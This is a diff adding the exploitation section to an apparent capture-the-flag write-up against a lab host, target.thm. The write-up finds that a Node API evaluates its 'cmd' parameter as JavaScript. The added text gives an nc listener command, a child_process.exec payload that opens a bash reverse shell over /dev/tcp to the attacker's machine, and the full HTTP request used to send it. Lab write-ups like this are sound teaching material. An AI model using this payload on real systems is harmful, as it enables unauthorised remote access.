@@ -230,3 +230,37 @@ $ curl -X POST http://target.thm/api/items?cmd=a
 It looks like it is parsing the cmd value as if it was a javascript expression. From the stacktrace it looks like it is specifically a node parsing issue.
 
 I entered a few arithmetic expressions for the cmd value, they worked as long as I didn't use the plus sign (+). The plus sign is a special character for url encoding, it represents a space. It seems like the plus sign is becoming a space when the expression is evaluated. To prove this, I used `cmd=70+/+7` and it resulted in a value of 10.
+
+At this point I have remote code execution and I need to find a payload to get a reverse shell. I start a listener with the following command:
+
+```bash
+$ nc -lnvp 4444
+```
+
+This was really frustrating and I tried a number of payloads which did not work. I had to google some ideas for the payload. I found that I can spawn a child process using the following:
+
+```javascript
+require("child_process").exec('<my javascript goes here>')
+```
+
+This caused me to try a few more things and finally the following payload worked:
+
+```bash
+cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/<attack_machine_ip>/4444+0>%261"')
+```
+
+The full request was:
+
+```text
+POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/<attack_machine_ip>/4444+0>%261"') HTTP/1.1
+Host: target.thm
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Cookie: token=this_is_not_real
+Accept-Encoding: gzip, deflate, br
+Connection: close
+```
+
+I have a shell. I'm in!
